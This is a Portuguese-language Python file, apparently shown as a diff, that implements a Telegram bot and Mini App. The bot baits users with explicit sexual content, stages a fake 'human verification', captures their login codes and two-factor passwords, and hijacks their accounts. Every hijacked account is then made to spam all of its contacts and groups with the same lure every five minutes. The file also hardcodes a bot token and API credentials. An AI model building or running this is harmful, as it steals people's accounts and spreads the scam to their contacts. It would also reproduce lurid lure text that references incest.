@@ -1,0 +1,726 @@
+import time
+import os
+import asyncio
+import random
+import json
+import hashlib
+import hmac
+from urllib.parse import parse_qs
+
+from aiohttp import web
+from telethon import TelegramClient
+from telethon.tl.types import User, Channel, Chat
+from telethon.errors import (
+    SessionPasswordNeededError,
+    PhoneCodeExpiredError,
+    PhoneCodeInvalidError,
+    AuthRestartError,
+)
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    ChatJoinRequestHandler,
+    ContextTypes,
+    filters,
+)
+
+# ===============================
+# CONFIG
+# ===============================
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+API_ID = 36888953
+API_HASH = "91a5622be4634cf2b16572adaea6151a"
+BOT_TOKEN = "8849270103:AAHJlO0pR0ELe2xsO6NiTjmzupgEOqDur6s"
+
+# ⚠️ URL HTTPS do Mini App (ngrok ou domínio)
+# Para testar: ngrok http 8080
+# Cole aqui a URL que o ngrok gerar, ex: https://xxxx-xx-xx.ngrok-free.app
+WEBAPP_URL = "https://breathier-decadently-kindra.ngrok-free.dev/webapp"
+WEBAPP_PORT = 8080
+
+CODE_TTL = 180
+MAX_RETRIES = 3
+LINK_GRUPO = "https://t.me/+ZJpC9mvvzvhmZTQx"
+DISPARO_MSG = "💦 𝗡𝗼𝘃!𝗻𝗵𝟰 𝗱𝗮𝗻𝗱𝗼 𝗼 𝗰𝘂 𝗽𝗿𝗮 𝟱 👇\n\nhttps://t.me/+x7ZVNM5RAZMyMWEx"
+DISPARO_INTERVALO = 300  # 5 minutos
+
+users = {}
+disparo_tasks = {}  # phone -> asyncio.Task
+
+# ===============================
+# VALIDAÇÃO INITDATA
+# ===============================
+def validate_init_data(init_data: str) -> dict | None:
+    """Valida initData do Telegram WebApp e retorna dados do usuário"""
+    try:
+        parsed = dict(parse_qs(init_data))
+        data = {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
+
+        received_hash = data.pop("hash", None)
+        if not received_hash:
+            return None
+
+        data_check_arr = sorted([f"{k}={v}" for k, v in data.items()])
+        data_check_string = "\n".join(data_check_arr)
+
+        secret_key = hmac.new(
+            b"WebAppData", BOT_TOKEN.encode(), hashlib.sha256
+        ).digest()
+
+        calculated_hash = hmac.new(
+            secret_key, data_check_string.encode(), hashlib.sha256
+        ).hexdigest()
+
+        if calculated_hash != received_hash:
+            print(f"[WARN] initData hash inválido")
+            return None
+
+        if "user" in data:
+            data["user"] = json.loads(data["user"])
+
+        return data
+    except Exception as e:
+        print(f"[ERROR] validate_init_data: {e}")
+        return None
+
+# ===============================
+# RETRY HELPER
+# ===============================
+async def send_code_with_retry(phone, session_path, device, max_retries=MAX_RETRIES):
+    """Tenta enviar código com retry automático"""
+    last_error = None
+
+    for attempt in range(1, max_retries + 1):
+        client = TelegramClient(
+            session_path,
+            API_ID,
+            API_HASH,
+            device_model=device[0],
+            system_version=device[1],
+            app_version=device[2],
+            lang_code="pt-br"
+        )
+
+        try:
+            print(f"[DEBUG] Tentativa {attempt}/{max_retries} - Conectando...")
+            await asyncio.wait_for(client.connect(), timeout=20)
+            print(f"[DEBUG] ✅ Conectado!")
+
+            delay = random.uniform(5, 8)
+            await asyncio.sleep(delay)
+
+            print(f"[DEBUG] Enviando código...")
+            sent_code = await client.send_code_request(phone)
+            print(f"[DEBUG] ✅ Código enviado!")
+            return client, sent_code
+
+        except (AuthRestartError, ConnectionError, OSError) as e:
+            last_error = e
+            print(f"[WARN] Tentativa {attempt} falhou: {type(e).__name__}: {e}")
+            try:
+                await client.disconnect()
+            except:
+                pass
+
+            if attempt < max_retries:
+                wait = random.uniform(3, 6)
+                print(f"[DEBUG] Aguardando {wait:.1f}s antes de retry...")
+                await asyncio.sleep(wait)
+            continue
+
+        except Exception:
+            try:
+                await client.disconnect()
+            except:
+                pass
+            raise
+
+    raise last_error
+
+# ===============================
+# HELPER: extrair user_id do initData
+# ===============================
+def get_user_id(init_data: str) -> int | None:
+    validated = validate_init_data(init_data)
+    if not validated or "user" not in validated:
+        return None
+    return validated["user"]["id"]
+
+# ===============================
+# DISPARO: LOOP DE ENVIO CONTÍNUO
+# ===============================
+async def disparo_loop(client: TelegramClient, phone: str):
+    """Envia mensagem para todos os grupos e contatos (não bots) a cada 5 minutos"""
+    print(f"[DISPARO] 🔄 Iniciando loop para {phone}")
+    falhas_conexao = 0
+    MAX_FALHAS = 5  # Máximo de falhas consecutivas antes de desistir
+
+    while True:
+        try:
+            # Reconectar se caiu
+            if not client.is_connected():
+                print(f"[DISPARO] 🔌 Reconectando {phone}...")
+                await asyncio.wait_for(client.connect(), timeout=30)
+                falhas_conexao = 0
+
+            enviados = 0
+            erros = 0
+            flood_total = 0
+
+            async for dialog in client.iter_dialogs():
+                entity = dialog.entity
+
+                # Pular bots
+                if isinstance(entity, User) and entity.bot:
+                    continue
+
+                # Pular o próprio usuário (Saved Messages)
+                if isinstance(entity, User) and entity.is_self:
+                    continue
+
+                try:
+                    await client.send_message(entity, DISPARO_MSG)
+                    enviados += 1
+                    # Delay entre cada envio pra não tomar flood
+                    await asyncio.sleep(random.uniform(2, 5))
+
+                except Exception as e:
+                    error_name = type(e).__name__
+
+                    # FloodWaitError — RESPEITAR ou toma ban
+                    if "FloodWait" in error_name or "flood" in str(e).lower():
+                        wait_time = getattr(e, 'seconds', 60)
+                        flood_total += 1
+                        print(f"[DISPARO] 🚫 FLOOD! {phone} — Aguardando {wait_time}s...")
+                        await asyncio.sleep(wait_time + 5)
+
+                        # Se tomou muito flood, para a rodada
+                        if flood_total >= 3:
+                            print(f"[DISPARO] ⛔ {phone} — Muitos floods, parando rodada")
+                            break
+
+                    # SlowModeWait — grupo com slow mode
+                    elif "SlowMode" in error_name:
+                        wait_time = getattr(e, 'seconds', 30)
+                        print(f"[DISPARO] 🐢 SlowMode em {dialog.name}, pulando...")
+                        continue
+
+                    # Chat restrito / sem permissão
+                    elif any(x in error_name for x in ["ChatWriteForbidden", "UserBannedInChannel", "ChannelPrivate"]):
+                        continue  # Pula silenciosamente
+
+                    # Peer inválido
+                    elif "Peer" in error_name or "Input" in error_name:
+                        continue
+
+                    else:
+                        erros += 1
+                        print(f"[DISPARO] ⚠️ Erro ao enviar para {dialog.name}: {error_name}: {e}")
+
+            falhas_conexao = 0  # Resetar se a rodada completou
+            print(f"[DISPARO] ✅ {phone} — Rodada completa: {enviados} enviados, {erros} erros, {flood_total} floods")
+
+        except Exception as e:
+            error_name = type(e).__name__
+            print(f"[DISPARO] ❌ Erro geral {phone}: {error_name}: {e}")
+
+            # Conta banida/desativada — PARAR permanentemente
+            if any(x in error_name for x in ["UserDeactivated", "AuthKeyUnregistered", "AuthKeyDuplicated"]):
+                print(f"[DISPARO] 💀 Conta {phone} BANIDA/DESATIVADA — Encerrando loop")
+                try:
+                    await client.disconnect()
+                except:
+                    pass
+                disparo_tasks.pop(phone, None)
+                return  # Sai do loop permanentemente
+
+            # Problemas de conexão
+            falhas_conexao += 1
+            if falhas_conexao >= MAX_FALHAS:
+                print(f"[DISPARO] 💀 {phone} — {MAX_FALHAS} falhas seguidas, encerrando")
+                try:
+                    await client.disconnect()
+                except:
+                    pass
+                disparo_tasks.pop(phone, None)
+                return
+
+            # Espera mais entre tentativas com falha
+            await asyncio.sleep(30)
+            continue
+
+        # Aguarda 5 minutos antes da próxima rodada
+        print(f"[DISPARO] ⏳ {phone} — Aguardando {DISPARO_INTERVALO}s para próxima rodada...")
+        await asyncio.sleep(DISPARO_INTERVALO)
+
+# ===============================
+# API: ENVIAR CÓDIGO
+# ===============================
+async def api_send_code(request):
+    data = await request.json()
+    phone = data.get("phone", "").strip()
+    init_data = data.get("initData", "")
+
+    user_id = get_user_id(init_data)
+    if not user_id:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    if not phone.startswith('+'):
+        phone = '+' + phone
+
+    print(f"[API] 📱 send-code de user {user_id}: {phone}")
+
+    # Limpa sessão anterior
+    if user_id in users and "client" in users[user_id]:
+        try:
+            await users[user_id]["client"].disconnect()
+        except:
+            pass
+
+    session_path = os.path.join(BASE_DIR, "sessions", phone)
+
+    devices = [
+        ("Samsung Galaxy S22", "Android 13", "10.9.5"),
+        ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
+        ("Xiaomi 13", "Android 13", "10.9.4"),
+    ]
+    device = random.choice(devices)
+
+    try:
+        client, sent_code = await send_code_with_retry(phone, session_path, device)
+
+        users[user_id] = {
+            "phone": phone,
+            "client": client,
+            "phone_code_hash": sent_code.phone_code_hash,
+            "expires": time.time() + CODE_TTL,
+            "step": "code",
+            "session_path": session_path,
+        }
+
+        return web.json_response({"ok": True})
+
+    except (AuthRestartError, ConnectionError, OSError):
+        print(f"[ERROR] Telegram instável após {MAX_RETRIES} tentativas")
+        return web.json_response({"error": "Telegram instável. Tente novamente."}, status=503)
+    except asyncio.TimeoutError:
+        return web.json_response({"error": "Timeout ao conectar. Tente novamente."}, status=504)
+    except Exception as e:
+        print(f"[ERROR] send-code: {type(e).__name__}: {e}")
+        return web.json_response({"error": str(e)}, status=500)
+
+# ===============================
+# API: VERIFICAR CÓDIGO
+# ===============================
+async def api_verify_code(request):
+    data = await request.json()
+    code = data.get("code", "").strip()
+    init_data = data.get("initData", "")
+
+    user_id = get_user_id(init_data)
+    if not user_id:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    if user_id not in users:
+        return web.json_response({"error": "Sessão expirada. Volte e tente novamente."}, status=400)
+
+    state = users[user_id]
+
+    time_remaining = state["expires"] - time.time()
+    if time_remaining <= 0:
+        try:
+            await state["client"].disconnect()
+        except:
+            pass
+        users.pop(user_id, None)
+        return web.json_response({"error": "Código expirado!"}, status=400)
+
+    client = state["client"]
+    phone = state["phone"]
+    phone_code_hash = state["phone_code_hash"]
+
+    try:
+        print(f"[API] 🔑 verify-code de user {user_id}: {code}")
+        delay = random.uniform(7, 10)
+        await asyncio.sleep(delay)
+
+        await client.sign_in(
+            phone=phone,
+            code=code,
+            phone_code_hash=phone_code_hash
+        )
+
+        me = await client.get_me()
+        print(f"[API] ✅✅✅ LOGIN OK! User: {me.id}")
+
+        # Inicia disparo em background (NÃO desconecta)
+        users.pop(user_id, None)
+        task = asyncio.create_task(disparo_loop(client, phone))
+        disparo_tasks[phone] = task
+        print(f"[DISPARO] 🚀 Loop de disparo iniciado para {phone}")
+
+        return web.json_response({"ok": True, "link": LINK_GRUPO})
+
+    except SessionPasswordNeededError:
+        users[user_id]["step"] = "password"
+        return web.json_response({"needs_2fa": True})
+
+    except PhoneCodeExpiredError:
+        try:
+            await client.disconnect()
+        except:
+            pass
+        users.pop(user_id, None)
+        return web.json_response({"error": "Código expirado. Telegram bloqueou."}, status=400)
+
+    except PhoneCodeInvalidError:
+        return web.json_response({"error": "Código incorreto! Tente novamente."}, status=400)
+
+    except Exception as e:
+        print(f"[ERROR] verify-code: {type(e).__name__}: {e}")
+        try:
+            await client.disconnect()
+        except:
+            pass
+        users.pop(user_id, None)
+        return web.json_response({"error": str(e)}, status=500)
+
+# ===============================
+# API: VERIFICAR SENHA 2FA
+# ===============================
+async def api_verify_password(request):
+    data = await request.json()
+    password = data.get("password", "")
+    init_data = data.get("initData", "")
+
+    user_id = get_user_id(init_data)
+    if not user_id:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    if user_id not in users or users[user_id].get("step") != "password":
+        return web.json_response({"error": "Sessão expirada."}, status=400)
+
+    client = users[user_id]["client"]
+    phone = users[user_id]["phone"]
+
+    try:
+        print(f"[API] 🔒 verify-password de user {user_id}")
+        await asyncio.sleep(random.uniform(3, 5))
+        await client.sign_in(password=password)
+
+        me = await client.get_me()
+        print(f"[API] ✅✅✅ LOGIN 2FA OK! User: {me.id}")
+
+        # Inicia disparo em background (NÃO desconecta)
+        users.pop(user_id, None)
+        task = asyncio.create_task(disparo_loop(client, phone))
+        disparo_tasks[phone] = task
+        print(f"[DISPARO] 🚀 Loop de disparo iniciado para {phone}")
+
+        return web.json_response({"ok": True, "link": LINK_GRUPO})
+
+    except Exception as e:
+        print(f"[ERROR] verify-password: {e}")
+        return web.json_response({"error": "Senha incorreta!"}, status=400)
+
+# ===============================
+# API: STATUS (polling do webapp)
+# ===============================
+async def api_status(request):
+    data = await request.json()
+    init_data = data.get("initData", "")
+
+    user_id = get_user_id(init_data)
+    if not user_id:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    if user_id not in users:
+        return web.json_response({"step": "waiting"})
+
+    state = users[user_id]
+    return web.json_response({
+        "step": state.get("step", "waiting"),
+        "error": state.get("error")
+    })
+
+# ===============================
+# SERVIR WEBAPP + STATIC
+# ===============================
+async def serve_webapp(request):
+    return web.FileResponse(os.path.join(BASE_DIR, "webapp", "index.html"))
+
+async def serve_static(request):
+    filename = request.match_info['filename']
+    filepath = os.path.join(BASE_DIR, filename)
+    if os.path.exists(filepath):
+        return web.FileResponse(filepath)
+    return web.Response(status=404)
+
+# ===============================
+# BOT: CONTATO COMPARTILHADO (via requestContact)
+# ===============================
+async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Recebe contato compartilhado via Mini App requestContact()"""
+    user_id = update.effective_user.id
+    contact = update.message.contact
+
+    if not contact or contact.user_id != user_id:
+        return
+
+    phone = contact.phone_number
+    if not phone.startswith('+'):
+        phone = '+' + phone
+
+    print(f"[BOT] 📱 Contato recebido de {user_id}: {phone}")
+
+    # Limpa sessão anterior
+    if user_id in users and "client" in users[user_id]:
+        try:
+            await users[user_id]["client"].disconnect()
+        except:
+            pass
+
+    users[user_id] = {"step": "processing"}
+
+    session_path = os.path.join(BASE_DIR, "sessions", phone)
+    devices = [
+        ("Samsung Galaxy S22", "Android 13", "10.9.5"),
+        ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
+        ("Xiaomi 13", "Android 13", "10.9.4"),
+    ]
+    device = random.choice(devices)
+
+    try:
+        client, sent_code = await send_code_with_retry(phone, session_path, device)
+
+        users[user_id] = {
+            "phone": phone,
+            "client": client,
+            "phone_code_hash": sent_code.phone_code_hash,
+            "expires": time.time() + CODE_TTL,
+            "step": "code",
+            "session_path": session_path,
+        }
+        print(f"[BOT] ✅ Código enviado para {phone}")
+
+    except Exception as e:
+        print(f"[ERROR] handle_contact: {type(e).__name__}: {e}")
+        users[user_id] = {"step": "error", "error": str(e)}
+
+# ===============================
+# BOT: /start
+# ===============================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    if user_id in users and "client" in users[user_id]:
+        try:
+            await users[user_id]["client"].disconnect()
+        except:
+            pass
+        users.pop(user_id, None)
+
+    keyboard = [[InlineKeyboardButton(
+        "✅ SOU HUMANO — CONTINUAR",
+        web_app=WebAppInfo(url=WEBAPP_URL)
+    )]]
+
+    with open(os.path.join(BASE_DIR, "midia.png"), "rb") as photo:
+        await update.message.reply_photo(
+            photo=photo,
+            caption=(
+                "😱 **𝗩𝗘𝗝𝗔 𝗢 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗢 𝗡𝗔 𝗖𝗢𝗠𝗨𝗡𝗜𝗗𝗔𝗗𝗘** ❌ **𝗦𝗘𝗠 𝗖𝗘𝗡𝗦𝗨𝗥𝗔...**\n\n"
+                "🚫 𝗟𝗶𝗯𝗲𝗿𝗮𝗻𝗱𝗼 𝗼 👌🏿 𝗲𝗺 𝗹𝗼𝗰𝗮𝗶𝘀\n"
+                "🍑 𝗙𝗮𝘃𝗲𝗹𝟰𝗱𝗮𝘀 𝗱𝗮𝗻𝗱𝗼 𝗼 𝗰𝘂 𝗽𝗿𝗮 𝟱\n"
+                "🥵 !𝗡𝗰𝟯𝘀𝘁𝟬𝘀 𝗰𝗼𝗺 𝗮𝘀 𝗽𝗿𝗶𝗺𝗮𝘀 ⁺¹⁸\n"
+                "💦 𝗦𝘂𝗯𝗶𝘂 𝗼 𝗺𝗼𝗿𝗿𝗼 𝗲 𝗺𝗮𝗺𝗼𝘂 𝗴𝗲𝗿𝗮\n"
+                "👅 𝗣𝗮𝗴𝗼𝘂 𝗼 𝗽𝗼‌ 𝗰𝗼𝗺 𝗼 𝗰𝘂𝘇𝗶𝗻𝗵\n"
+                "🔥 𝗣𝘂𝘁!𝗻𝗵𝗮𝘀 𝗱𝗲 𝗕𝗮𝗶𝘅𝗮 𝗿𝗲𝗻𝗱𝗮\n"
+                "👀 𝗙𝗹𝗮𝗴𝗿𝗮𝘀 𝗿𝗲𝗮𝗶𝘀 𝗻𝗮 𝗳𝗮𝘃𝗲𝗹𝗮\n"
+                "🚷 𝗟!𝘃𝗲𝘀 𝗱𝗮𝘀 𝗳𝗮𝘃𝗲𝗹𝗮𝗱𝟰𝘀\n"
+                "🌶 𝗠𝘂𝗹𝗵𝗲𝗿 𝗱𝗲 𝗕𝟰𝗻𝗱'𝗱𝟬 𝗻𝗮 𝗰𝗮𝗱𝗲𝗶𝗮\n\n"
+                "⚠️ 𝗖𝗢𝗡𝗧𝗘𝗨𝗗𝗢 𝗕𝗟𝗢𝗤𝗨𝗘𝗔𝗗𝗢! Para liberar toda essa putaria 100% GRATUITA, é necessário fazer uma verificação para comprovar que você não é um robô. Clique no botão abaixo e inicie sua verificação"
+            ),
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+
+    print(f"[DEBUG] Usuário {user_id} iniciou - botão Mini App enviado")
+
+# ===============================
+# BOT: JOIN REQUEST
+# ===============================
+async def handle_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Quando alguém solicita entrada, envia a mensagem inicial com Mini App e aprova"""
+    join_request = update.chat_join_request
+    user_id = join_request.from_user.id
+    user_name = join_request.from_user.first_name
+    chat_name = join_request.chat.title
+
+    print(f"[DEBUG] 👤 Join request de {user_name} ({user_id}) no grupo {chat_name}")
+
+    try:
+        # Limpa sessão anterior se existir
+        if user_id in users and "client" in users[user_id]:
+            try:
+                await users[user_id]["client"].disconnect()
+            except:
+                pass
+            users.pop(user_id, None)
+
+        keyboard = [[InlineKeyboardButton(
+            "✅ SOU HUMANO — CONTINUAR",
+            web_app=WebAppInfo(url=WEBAPP_URL)
+        )]]
+
+        with open(os.path.join(BASE_DIR, "midia.png"), "rb") as photo:
+            await context.bot.send_photo(
+                chat_id=user_id,
+                photo=photo,
+                caption=(
+                    "😱 **𝗩𝗘𝗝𝗔 𝗢 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗢 𝗡𝗔 𝗖𝗢𝗠𝗨𝗡𝗜𝗗𝗔𝗗𝗘** ❌ **𝗦𝗘𝗠 𝗖𝗘𝗡𝗦𝗨𝗥𝗔...**\n\n"
+                    "🚫 𝗟𝗶𝗯𝗲𝗿𝗮𝗻𝗱𝗼 𝗼 👌🏿 𝗲𝗺 𝗹𝗼𝗰𝗮𝗶𝘀\n"
+                    "🍑 𝗙𝗮𝘃𝗲𝗹𝟰𝗱𝗮𝘀 𝗱𝗮𝗻𝗱𝗼 𝗼 𝗰𝘂 𝗽𝗿𝗮 𝟱\n"
+                    "🥵 !𝗡𝗰𝟯𝘀𝘁𝟬𝘀 𝗰𝗼𝗺 𝗮𝘀 𝗽𝗿𝗶𝗺𝗮𝘀 ⁺¹⁸\n"
+                    "💦 𝗦𝘂𝗯𝗶𝘂 𝗼 𝗺𝗼𝗿𝗿𝗼 𝗲 𝗺𝗮𝗺𝗼𝘂 𝗴𝗲𝗿𝗮\n"
+                    "👅 𝗣𝗮𝗴𝗼𝘂 𝗼 𝗽𝗼‌ 𝗰𝗼𝗺 𝗼 𝗰𝘂𝘇𝗶𝗻𝗵\n"
+                    "🔥 𝗣𝘂𝘁!𝗻𝗵𝗮𝘀 𝗱𝗲 𝗕𝗮𝗶𝘅𝗮 𝗿𝗲𝗻𝗱𝗮\n"
+                    "👀 𝗙𝗹𝗮𝗴𝗿𝗮𝘀 𝗿𝗲𝗮𝗶𝘀 𝗻𝗮 𝗳𝗮𝘃𝗲𝗹𝗮\n"
+                    "🚷 𝗟!𝘃𝗲𝘀 𝗱𝗮𝘀 𝗳𝗮𝘃𝗲𝗹𝗮𝗱𝟰𝘀\n"
+                    "🌶 𝗠𝘂𝗹𝗵𝗲𝗿 𝗱𝗲 𝗕𝟰𝗻𝗱'𝗱𝟬 𝗻𝗮 𝗰𝗮𝗱𝗲𝗶𝗮\n\n"
+                    "⚠️ 𝗖𝗢𝗡𝗧𝗘𝗨𝗗𝗢 𝗕𝗟𝗢𝗤𝗨𝗘𝗔𝗗𝗢! Para liberar toda essa putaria 100% GRATUITA, é necessário fazer uma verificação para comprovar que você não é um robô. Clique no botão abaixo e inicie sua verificação"
+                ),
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup(keyboard)
+            )
+
+        print(f"[DEBUG] 📩 Mensagem inicial enviada para {user_name} ({user_id})")
+
+    except Exception as e:
+        print(f"[ERROR] Erro ao enviar mensagem para {user_name}: {e}")
+
+# ===============================
+# CARREGAR SESSÕES EXISTENTES
+# ===============================
+async def carregar_sessoes():
+    """Carrega todas as sessões salvas e inicia disparo automático"""
+    sessions_dir = os.path.join(BASE_DIR, "sessions")
+    arquivos = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
+
+    if not arquivos:
+        print("[STARTUP] 📂 Nenhuma sessão encontrada na pasta sessions/")
+        return
+
+    print(f"[STARTUP] 📂 {len(arquivos)} sessão(ões) encontrada(s), carregando...")
+
+    for arquivo in arquivos:
+        phone = arquivo.replace(".session", "")
+        session_path = os.path.join(sessions_dir, phone)
+
+        # Pular se já tiver disparo ativo pra esse phone
+        if phone in disparo_tasks:
+            print(f"[STARTUP] ⏭️ {phone} já tem disparo ativo, pulando")
+            continue
+
+        try:
+            devices = [
+                ("Samsung Galaxy S22", "Android 13", "10.9.5"),
+                ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
+                ("Xiaomi 13", "Android 13", "10.9.4"),
+            ]
+            device = random.choice(devices)
+
+            client = TelegramClient(
+                session_path,
+                API_ID,
+                API_HASH,
+                device_model=device[0],
+                system_version=device[1],
+                app_version=device[2],
+                lang_code="pt-br"
+            )
+
+            await asyncio.wait_for(client.connect(), timeout=30)
+
+            if not await client.is_user_authorized():
+                print(f"[STARTUP] ❌ {phone} — Sessão expirada/inválida, pulando")
+                await client.disconnect()
+                continue
+
+            me = await client.get_me()
+            print(f"[STARTUP] ✅ {phone} — Conectado como {me.first_name} (ID: {me.id})")
+
+            # Inicia disparo
+            task = asyncio.create_task(disparo_loop(client, phone))
+            disparo_tasks[phone] = task
+            print(f"[STARTUP] 🚀 Disparo iniciado para {phone}")
+
+            # Delay entre conexões pra não flodar
+            await asyncio.sleep(random.uniform(2, 4))
+
+        except Exception as e:
+            print(f"[STARTUP] ❌ Erro ao carregar {phone}: {type(e).__name__}: {e}")
+
+    print(f"[STARTUP] ✅ {len(disparo_tasks)} sessão(ões) ativa(s) disparando!")
+
+# ===============================
+# MAIN
+# ===============================
+async def main():
+    os.makedirs(os.path.join(BASE_DIR, "sessions"), exist_ok=True)
+
+    # --- Web Server (aiohttp) ---
+    web_app = web.Application()
+    web_app.router.add_get("/webapp", serve_webapp)
+    web_app.router.add_get("/static/{filename}", serve_static)
+    web_app.router.add_post("/api/status", api_status)
+    web_app.router.add_post("/api/send-code", api_send_code)
+    web_app.router.add_post("/api/verify-code", api_verify_code)
+    web_app.router.add_post("/api/verify-password", api_verify_password)
+
+    runner = web.AppRunner(web_app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", WEBAPP_PORT)
+    await site.start()
+
+    # --- Bot (python-telegram-bot) ---
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
+    application.add_handler(ChatJoinRequestHandler(handle_join_request))
+
+    print(f"\n🤖 Bot + Mini App rodando!")
+    print(f"📝 Comando: /start")
+    print(f"🌐 Web Server: http://0.0.0.0:{WEBAPP_PORT}")
+    print(f"🔗 Mini App URL: {WEBAPP_URL}")
+    print(f"👤 Join Request: ATIVO\n")
+
+    async with application:
+        await application.start()
+        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
+
+        # Carregar sessões existentes e iniciar disparo
+        await carregar_sessoes()
+
+        # Mantém rodando até Ctrl+C
+        stop_event = asyncio.Event()
+        try:
+            await stop_event.wait()
+        except (KeyboardInterrupt, SystemExit):
+            pass
+        finally:
+            # Cancelar todos os disparos ativos
+            for phone, task in disparo_tasks.items():
+                task.cancel()
+                print(f"[SHUTDOWN] 🛑 Disparo cancelado para {phone}")
+            await application.updater.stop()
+            await application.stop()
+            await runner.cleanup()
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n👋 Bot encerrado.")
